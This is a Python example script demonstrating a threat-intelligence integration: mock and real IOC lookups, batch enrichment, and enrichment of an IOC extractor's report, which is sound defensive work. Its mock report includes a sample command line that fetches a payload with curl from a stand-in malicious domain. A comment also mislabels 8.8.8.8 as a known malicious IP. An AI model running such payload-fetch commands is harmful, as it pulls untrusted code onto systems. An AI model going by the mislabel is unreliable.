"""
Example usage of threat intelligence integration.

Demonstrates how to use the threat intelligence providers and IOC enricher.
"""
import asyncio
import logging
from datetime import datetime

from analysis_engine.threat_intel import (
    CacheManager,
    AbuseIPDBProvider,
    VirusTotalProvider,
    MockThreatIntelProvider,
    IOCEnricher,
    create_enricher_from_config
)
from config import get_settings

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


async def example_1_basic_provider_usage():
    """Example 1: Basic usage of individual providers."""
    print("\n" + "="*70)
    print("Example 1: Basic Provider Usage")
    print("="*70)

    # Initialize cache
    cache_manager = CacheManager(
        cache_dir="./data/threat_intel_cache",
        default_ttl=3600
    )

    # Use mock provider for testing without API keys
    provider = MockThreatIntelProvider(cache_manager=cache_manager)

    # Check an IP address
    print("\n--- Checking IP Address ---")
    ip_result = await provider.check_ip("192.168.1.100")
    print(f"IP: {ip_result['ip_address']}")
    print(f"Is Malicious: {ip_result['is_malicious']}")
    print(f"Threat Level: {ip_result['threat_level']}")
    print(f"Abuse Score: {ip_result.get('abuse_confidence_score', 'N/A')}")

    # Check a domain
    print("\n--- Checking Domain ---")
    domain_result = await provider.check_domain("malicious-example.com")
    print(f"Domain: {domain_result['domain']}")
    print(f"Is Malicious: {domain_result['is_malicious']}")
    print(f"Threat Level: {domain_result['threat_level']}")

    # Check a file hash
    print("\n--- Checking File Hash ---")
    hash_result = await provider.check_file_hash("d41d8cd98f00b204e9800998ecf8427e1234567890")
    print(f"Hash: {hash_result['file_hash']}")
    print(f"Is Malicious: {hash_result['is_malicious']}")
    print(f"Threat Level: {hash_result['threat_level']}")

    # Show cache stats
    print("\n--- Cache Statistics ---")
    stats = cache_manager.get_stats()
    print(f"Total Entries: {stats['total_entries']}")
    print(f"Active Entries: {stats['active_entries']}")
    print(f"Cache Size: {stats['total_size_mb']} MB")


async def example_2_real_providers():
    """Example 2: Using real providers (requires API keys)."""
    print("\n" + "="*70)
    print("Example 2: Real Provider Usage (with API keys)")
    print("="*70)

    settings = get_settings()

    # Initialize cache
    cache_manager = CacheManager(
        cache_dir="./data/threat_intel_cache",
        default_ttl=settings.threat_intel_cache_ttl
    )

    # Initialize providers if API keys are available
    if settings.abuseipdb_api_key:
        print("\n--- Using AbuseIPDB ---")
        abuseipdb = AbuseIPDBProvider(
            api_key=settings.abuseipdb_api_key,
            cache_manager=cache_manager
        )

        # Check a known malicious IP (example)
        ip_result = await abuseipdb.check_ip("8.8.8.8")
        print(f"IP: {ip_result.get('ip_address', 'N/A')}")
        print(f"Abuse Score: {ip_result.get('abuse_confidence_score', 'N/A')}")
        print(f"Country: {ip_result.get('country_code', 'N/A')}")
        print(f"ISP: {ip_result.get('isp', 'N/A')}")
        print(f"Total Reports: {ip_result.get('total_reports', 0)}")
    else:
        print("\nAbuseIPDB API key not configured. Set ABUSEIPDB_API_KEY in .env")

    if settings.virustotal_api_key:
        print("\n--- Using VirusTotal ---")
        virustotal = VirusTotalProvider(
            api_key=settings.virustotal_api_key,
            cache_manager=cache_manager
        )

        # Check a domain
        domain_result = await virustotal.check_domain("google.com")
        print(f"Domain: {domain_result.get('domain', 'N/A')}")
        print(f"Malicious Count: {domain_result.get('malicious_count', 0)}")
        print(f"Total Engines: {domain_result.get('total_engines', 0)}")
        print(f"Threat Level: {domain_result.get('threat_level', 'N/A')}")
    else:
        print("\nVirusTotal API key not configured. Set VIRUSTOTAL_API_KEY in .env")


async def example_3_ioc_enrichment():
    """Example 3: Enriching IOCs with the IOC Enricher."""
    print("\n" + "="*70)
    print("Example 3: IOC Enrichment")
    print("="*70)

    # Initialize cache
    cache_manager = CacheManager(
        cache_dir="./data/threat_intel_cache",
        default_ttl=3600
    )

    # Create mock provider for testing
    mock_provider = MockThreatIntelProvider(cache_manager=cache_manager)

    # Create enricher
    enricher = IOCEnricher(
        providers=[mock_provider],
        cache_manager=cache_manager,
        max_concurrent_requests=10,
        batch_size=50
    )

    # Enrich a single IOC
    print("\n--- Enriching Single IOC ---")
    single_result = await enricher.enrich_ioc(
        ioc_type="ip",
        ioc_value="192.168.1.100"
    )
    print(f"IOC: {single_result['ioc_value']}")
    print(f"Type: {single_result['ioc_type']}")
    print(f"Providers Queried: {single_result['providers_queried']}")
    print(f"Threat Assessment: {single_result['threat_assessment']}")

    # Enrich multiple IOCs in batch
    print("\n--- Enriching Multiple IOCs (Batch) ---")
    iocs_to_enrich = {
        "ip": ["192.168.1.100", "10.0.0.1", "172.16.0.1"],
        "domain": ["malicious-example.com", "safe-example.com"]
    }

    batch_results = await enricher.enrich_iocs_batch(iocs_to_enrich)

    print(f"\nEnriched {sum(len(v) for v in batch_results.values())} IOCs")
    for ioc_type, enriched_iocs in batch_results.items():
        print(f"\n{ioc_type.upper()}s:")
        for ioc in enriched_iocs:
            assessment = ioc.get("threat_assessment", {})
            print(f"  - {ioc['ioc_value']}: {assessment.get('overall_threat_level', 'unknown')}")


async def example_4_ioc_report_enrichment():
    """Example 4: Enriching a full IOC report."""
    print("\n" + "="*70)
    print("Example 4: IOC Report Enrichment")
    print("="*70)

    # Create mock IOC report (as would be generated by IOC extractor)
    mock_ioc_report = {
        "iocs": {
            "ip_addresses": ["192.168.1.100", "10.0.0.1", "172.16.0.1"],
            "domains": ["malicious-example.com", "safe-example.com"],
            "principals": ["admin@example.com"],
            "command_lines": ["curl http://malicious-example.com/payload"]
        },
        "severity_classified": {
            "critical": [],
            "high": [
                {"type": "principal", "value": "admin@example.com", "reason": "Compromised account"}
            ],
            "medium": [],
            "low": []
        },
        "summary": "Extracted 6 indicators of compromise from session",
        "generation_method": "template"
    }

    # Initialize enricher
    cache_manager = CacheManager(cache_dir="./data/threat_intel_cache")
    mock_provider = MockThreatIntelProvider(cache_manager=cache_manager)
    enricher = IOCEnricher(providers=[mock_provider], cache_manager=cache_manager)

    # Enrich the report
    print("\n--- Enriching IOC Report ---")
    enriched_report = await enricher.enrich_ioc_report(mock_ioc_report)

    # Display results
    print("\nOriginal IOCs:")
    for ioc_type, iocs in enriched_report.get("iocs", {}).items():
        print(f"  {ioc_type}: {len(iocs)} items")

    print("\nThreat Intelligence:")
    for ioc_type, enrichments in enriched_report.get("threat_intelligence", {}).items():
        print(f"\n  {ioc_type.upper()}:")
        for enrichment in enrichments:
            assessment = enrichment.get("threat_assessment", {})
            print(f"    - {enrichment['ioc_value']}: "
                  f"threat={assessment.get('overall_threat_level', 'unknown')}, "
                  f"malicious={assessment.get('is_malicious', False)}")

    print("\nThreat Summary:")
    summary = enriched_report.get("threat_summary", {})
    print(f"  Total IOCs Enriched: {summary.get('total_iocs_enriched', 0)}")
    print(f"  Malicious IOCs: {summary.get('malicious_iocs', 0)}")
    print(f"  Overall Risk Level: {summary.get('overall_risk_level', 'unknown')}")
    print(f"  Requires Immediate Attention: {summary.get('requires_immediate_attention', False)}")

    print("\nEnrichment Metadata:")
    metadata = enriched_report.get("enrichment_metadata", {})
    print(f"  Providers Used: {', '.join(metadata.get('providers_used', []))}")
    print(f"  Processing Time: {metadata.get('processing_time_seconds', 0):.2f}s")


async def example_5_config_based_setup():
    """Example 5: Using config-based enricher setup."""
    print("\n" + "="*70)
    print("Example 5: Config-Based Enricher Setup")
    print("="*70)

    settings = get_settings()

    print(f"\nThreat Intel Enabled: {settings.enable_threat_intel}")
    print(f"AbuseIPDB Configured: {settings.abuseipdb_api_key is not None}")
    print(f"VirusTotal Configured: {settings.virustotal_api_key is not None}")
    print(f"Cache TTL: {settings.threat_intel_cache_ttl}s")

    # Create enricher from config
    enricher = create_enricher_from_config(settings)

    print(f"\nEnricher created with {len(enricher.providers)} provider(s):")
    for provider in enricher.providers:
        print(f"  - {provider.__class__.__name__}")

    # Test enrichment
    print("\n--- Testing Enrichment ---")
    test_result = await enricher.enrich_ioc("ip", "8.8.8.8")
    print(f"IP: {test_result['ioc_value']}")
    print(f"Providers Queried: {test_result['providers_queried']}")
    print(f"Threat Level: {test_result['threat_assessment']['overall_threat_level']}")

    # Show cache stats
    if enricher.cache_manager:
        print("\n--- Cache Statistics ---")
        stats = enricher.get_cache_stats()
        print(f"Active Entries: {stats['active_entries']}")
        print(f"Cache Directory: {stats['cache_dir']}")


async def example_6_integration_with_ioc_extractor():
    """Example 6: Integration with IOC Extractor Agent."""
    print("\n" + "="*70)
    print("Example 6: Integration with IOC Extractor Agent")
    print("="*70)

    from analysis_engine.agents.ioc_extractor_agent import IocExtractorAgent
    from analysis_engine.core.parser import NormalizedEvent
    from analysis_engine.core.correlation import CorrelationSession

    # Create enricher
    settings = get_settings()
    enricher = create_enricher_from_config(settings)

    # Create IOC extractor with threat intel enrichment
    ioc_extractor = IocExtractorAgent(
        llm_provider=None,
        use_llm=False,
        threat_intel_enricher=enricher,
        enable_enrichment=True
    )

    # Create mock events for testing
    mock_events = [
        NormalizedEvent(
            timestamp=datetime.utcnow(),
            event_type="cloudtrail",
            principal="admin@example.com",
            action="AssumeRole",
            resource="arn:aws:iam::123456789012:role/AdminRole",
            status="success",
            source_ip="192.168.1.100",
            user_agent="aws-cli/2.0",
            metadata={"suspicious": True}
        ),
        NormalizedEvent(
            timestamp=datetime.utcnow(),
            event_type="cloudtrail",
            principal="admin@example.com",
            action="DeleteBucket",
            resource="arn:aws:s3:::sensitive-data",
            status="success",
            source_ip="192.168.1.100",
            user_agent="aws-cli/2.0",
            metadata={"suspicious": True}
        )
    ]

    # Create correlation session
    session = CorrelationSession(
        session_id="test-session-001",
        start_time=datetime.utcnow(),
        events=mock_events
    )

    # Extract and enrich IOCs
    print("\n--- Extracting and Enriching IOCs ---")
    ioc_report = ioc_extractor.extract_from_session(session)

    # Display results
    print("\nExtracted IOCs:")
    for ioc_type, iocs in ioc_report.get("iocs", {}).items():
        if iocs:
            print(f"  {ioc_type}: {iocs}")

    if "threat_intelligence" in ioc_report:
        print("\nThreat Intelligence Enrichment:")
        for ioc_type, enrichments in ioc_report.get("threat_intelligence", {}).items():
            print(f"\n  {ioc_type}:")
            for enrichment in enrichments:
                assessment = enrichment.get("threat_assessment", {})
                print(f"    - {enrichment['ioc_value']}: "
                      f"{assessment.get('overall_threat_level', 'unknown')}")

        print("\nThreat Summary:")
        summary = ioc_report.get("threat_summary", {})
        print(f"  Overall Risk: {summary.get('overall_risk_level', 'unknown')}")
        print(f"  Malicious IOCs: {summary.get('malicious_iocs', 0)}")
        print(f"  Immediate Attention Required: {summary.get('requires_immediate_attention', False)}")
    else:
        print("\nNo threat intelligence enrichment performed")


async def main():
    """Run all examples."""
    print("\n" + "="*70)
    print("THREAT INTELLIGENCE INTEGRATION - EXAMPLES")
    print("="*70)

    try:
        # Example 1: Basic provider usage
        await example_1_basic_provider_usage()

        # Example 2: Real providers (if API keys configured)
        # await example_2_real_providers()  # Uncomment if you have API keys

        # Example 3: IOC enrichment
        await example_3_ioc_enrichment()

        # Example 4: IOC report enrichment
        await example_4_ioc_report_enrichment()

        # Example 5: Config-based setup
        await example_5_config_based_setup()

        # Example 6: Integration with IOC extractor
        await example_6_integration_with_ioc_extractor()

        print("\n" + "="*70)
        print("All examples completed successfully!")
        print("="*70)

    except Exception as e:
        logger.error(f"Error running examples: {e}", exc_info=True)


if __name__ == "__main__":
    asyncio.run(main())
